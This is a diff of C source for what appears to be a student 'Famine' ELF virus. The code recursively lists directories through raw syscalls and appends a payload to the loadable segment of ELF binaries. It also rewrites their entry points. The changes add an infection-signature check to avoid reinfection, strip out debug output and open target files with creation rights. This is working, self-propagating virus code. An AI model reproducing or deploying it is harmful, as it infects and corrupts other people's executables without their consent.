@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/05/28 18:16:02 by root             ###   ########.fr       */
+/*   Updated: 2018/05/29 05:17:51 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -64,7 +64,7 @@ void	find_files(char *dir)
 	fd = syscall(OPEN, dir, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0);
 	if (fd == -1)
 		return ;
-	while ((ret = syscall(GETDENTS64, fd, buff, 1024)) > 0)
+	while ((ret = syscall(GETDENTS64, fd, buff, 1023)) > 0)
 	{
 		off = 0;
 		while (off < ret)
@@ -145,6 +145,9 @@ void		pack_dat_elf(char *path, int size, char *data)
 		}
 		if (iprogram == NULL)
 			return ;
+		uint32_t sign = *(data + iprogram->p_offset + iprogram->p_memsz);
+		if (sign == 0x42CAFE42)
+			return ;
 
 		/* Extra: Change the offset of sections higher than our code offset, for debug. */
 		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
@@ -154,10 +157,6 @@ void		pack_dat_elf(char *path, int size, char *data)
 				section[i].sh_offset += famine64_size;
 			}
 		}
-
-		printf("entry:%p off:%#x flags:%#x memsz:%#x filesz:%#x\n",
-			   ((Elf64_Ehdr *)data)->e_entry, ((Elf64_Ehdr *)data)->e_shoff,
-			   iprogram->p_flags, iprogram->p_memsz, iprogram->p_filesz);
 
 		/* 2. Compute the virtual address of our code */
 		Elf64_Addr new_entry = iprogram->p_vaddr + iprogram->p_memsz;
@@ -173,35 +172,27 @@ void		pack_dat_elf(char *path, int size, char *data)
 		iprogram->p_memsz += famine64_size;
 		iprogram->p_filesz = iprogram->p_memsz;
 
-		printf("entry:%p off:%#x flags:%#x memsz:%#x filesz:%#x\n",
-			   ((Elf64_Ehdr *)data)->e_entry, ((Elf64_Ehdr *)data)->e_shoff,
-			   iprogram->p_flags, iprogram->p_memsz, iprogram->p_filesz);
-
-		int fd = syscall(OPEN, path, O_WRONLY, 0);
+		int fd = syscall(OPEN, path, O_WRONLY|O_CREAT, 0755);
 		if (fd == -1){
 			write(1, "OPEN file failed\n", 17);
 			return ;
 		}
 		/* Get the offset in file to write our code */
 		size_t off = iprogram->p_offset + iprogram->p_memsz - famine64_size;
-		printf("Writing %#x bytes...", off);
 		if (write(fd, data, off) <= 0)
 		{
 			perror("WRITE failed");
 			return ;
 		}
-		printf(" OK\nWriting %#x bytes...", famine64_size - sizeof(old_entry));
+
 		if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) <= 0)
 			return ;
-		printf(" OK\nWriting %#x bytes...", sizeof(old_entry));
+
 		if (write(fd, &old_entry, sizeof(old_entry)) <= 0)
 			return ;
-		printf(" OK\nWriting %#x bytes...", size - off);
+
 		if (write(fd, data + off, size - off) <= 0)
 			return ;
-		printf(" OK\n");
-//		syscall(MSYNC, data, size, MS_SYNC);
-		printf("%#x\n", famine64_size);
 		syscall(CLOSE, fd);
 	}
 }
